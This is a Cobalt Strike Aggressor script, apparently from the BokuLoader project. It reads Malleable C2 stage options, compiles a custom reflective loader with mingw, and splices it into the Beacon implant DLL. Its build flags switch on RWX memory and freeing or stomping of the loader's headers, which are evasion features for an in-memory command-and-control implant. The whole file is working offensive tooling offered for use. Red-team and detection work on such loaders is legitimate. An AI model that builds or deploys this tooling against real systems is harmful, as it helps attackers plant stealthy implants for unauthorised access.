#$debug = "true";
$debug = "false";

sub caseInsensitiveCompare {
    $a = lc($1);
    $b = lc($2);
    return $a cmp $b;
}

sub dump_my_pe {
    local('$out $key $val %pemap @sorted_keys');
    %pemap = pedump($1);
    @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
    foreach $key (@sorted_keys) {
        $out = "$[50]key";
        foreach $val (values(%pemap, @($key))) {
            $out .= " $val";
            println($out);
        }
    }
    local('@loc_cs @val_cs');
    @loc_cs = values(%pemap, @("CheckSum."));
    @val_cs = values(%pemap, @("CheckSum."));
    println("");
    println("My DLL CheckSum Location: " . @loc_cs);
    println("My DLL CheckSum Value: " . @val_cs);
    println("");
}

sub generate_my_dll {
    local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
    local('$Compile $CC_x64 $CC_x86 @OPTIONS $scRscPath $rlOF $opts $pRlOF $procexec @dataA');

    # Retreive the Malleable PE Option values declared in the CS Server Profile with in the stage{} block
    $profile    = data_query("metadata")["c2profile"];
    $userwx     = [$profile getString: ".stage.userwx"];
    $obfuscate  = [$profile getString: ".stage.obfuscate"];
    $sleep_mask = [$profile getString: ".stage.sleep_mask"];
    $stomppe    = [$profile getString: ".stage.stomppe"];

    # Display the supported Malleable PE Option values to the Cobalt Strike Script Console
    println("Malleable PE Options:");
    println("|_ UseRWX     : $userwx");
    println("|_ Obfuscate  : $obfuscate");
    println("|_ Sleep_Mask : $sleep_mask");
    println("|_ StompPE    : $stomppe");

    # Setup the mingw GCC compile string which will create the Reflective Loader Object File based on the Malleable PE Options
    $Compile = '';
    $CC_x64  = 'x86_64-w64-mingw32-gcc';
    $CC_x86  = 'i686-w64-mingw32-gcc';
    @OPTIONS = @('-masm=intel', '-Wall', '-Wno-pointer-arith');

    # Get the file path for BokuLoader
    $scRscPath = script_resource();
    println("BokuLoader file path: $scRscPath");
    $scRscPath = $scRscPath.'/';
    # File name for the to be compiled reflective loader object file
    $rlOF = "BokuLoader.".$3.'.o';

    # The version of mingw GCC used to compile BokuLoader will depend on the selected beacon arcitecture
    println("[+] Beacon Architecture: $3");
    if($3 eq "x64"){
        $Compile = $CC_x64;
    }else {
        $Compile = $CC_x86;
    }

    # The compile string uses full paths when compiling BokuLoader
    $Compile = $Compile.' -c '.$scRscPath.'BokuLoader.'.$3.'.c'.' -o '.$scRscPath.$rlOF;

    #println("[+] Arch Compile String: $Compile");

    # Check if we should enable RWX. If sleepmask in enabled, we override a useRWX false. 
    #  - Else sleepmask will brick beacon when attempting to encrypt non-writeable beacon memory
    if ($sleep_mask eq "true" || $userwx eq "true") {
        if ($userwx eq "false") {
            warn("Sleep_Mask requires RWX or beacon will brick");
        }
        println("[+] Compiling with RWX");
        push(@OPTIONS,'-DUSE_RWX');
    } else {
        println("[+] Compiling with No RWX");
    }

    # Check if we need to free or stomp the headers
    if ($obfuscate eq "true") {
        println("[+] Compiling with Free  Reflective DLL Header");
        push(@OPTIONS,'-DFREE_HEADERS');
    } else if ($stomppe eq "true") {
        println("[+] Compiling with Stomp Reflective DLL Header");
        push(@OPTIONS,'-DSTOMP_HEADERS');
    } else {
        println("[+] Compiling with Leave Reflective DLL Header");
    }

    # Flatten all the reflective loader compile options into a string and add options string to compile string
    $opts = ' '.join(' ', @OPTIONS);
    $Compile .= $opts;

    # Linux, mingw will be in /usr/bin/ - on macos mingw will be in /usr/local/bin/ which will not be in the $PATH for exec()
    $pRlOF = $scRscPath.$rlOF;
    if (-isFile $pRlOF) {
        deleteFile($pRlOF);
    }
    $procexec = exec($Compile);
    if (-isFile $pRlOF) {
        println("[+] Compiled Reflective Loader to object file: $pRlOF");
    }else{
        warn("Could not find mingw in \$PATH. Trying in /usr/local/bin/ directory.");
        $Compile = "/usr/local/bin/".$Compile;
        #println("[+] Compile command: $Compile");
        $procexec = exec($Compile);
        # Needs this readAll() or compile command wont process
        @dataA = readAll($procexec);
        if (-isFile $pRlOF) {
            println("[+] Compiled Reflective Loader to object file: $pRlOF");
        }
    }
    closef($procexec);

    # Get the bytes for the compiled Reflective Loader object file
    $handle = openf(script_resource($rlOF));
    $data   = readb($handle, -1);
    closef($handle);

    warn("Loaded Length: " . strlen($data));

    if (strlen($data) eq 0) {
        warn("Error loading reflective loader object file.");
        return $null;
    }

    # extract loader ($loader) from the object file data ($data).
    $loader = extract_reflective_loader($data);
    warn("Extracted Length: " . strlen($loader));
    if (strlen($loader) eq 0) {
        warn("Error extracting reflective loader.");
        return $null;
    }
    # Setup the reflective loader ($loader) in the beacon ($2).
    $temp_dll = setup_reflective_loader($2, $loader);

    if ($debug eq "true") {
        dump_my_pe($temp_dll);
    }
    # Give back the updated beacon DLL.
    return $temp_dll;
}

# $1 = DLL file name # $2 = DLL content # $3 = arch
set BEACON_RDLL_GENERATE {
    warn("========== Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3 . " ==========");
    return generate_my_dll($1, $2, $3);
}

# $1 = DLL file name # $2 = DLL content # $3 = arch # $4 = parent Beacon ID # $5 = GetModuleHandleA pointer # $6 = GetProcAddress pointer
set BEACON_RDLL_GENERATE_LOCAL {
    warn("========== Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . $1 . " with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA " . $5 . " GetProcAddress " . $6 . " ==========");
    return generate_my_dll($1, $2, $3);
}

# Override the beacon loader to load beacons with larger space reserved for the User Defined Reflective Loader function.
# $1 = dll name # $2 = arch
set BEACON_RDLL_SIZE {
    warn("========== Running 'BEACON_RDLL_SIZE' for DLL Name " . $1 . " with architecture " . $2);
    return "100";
}
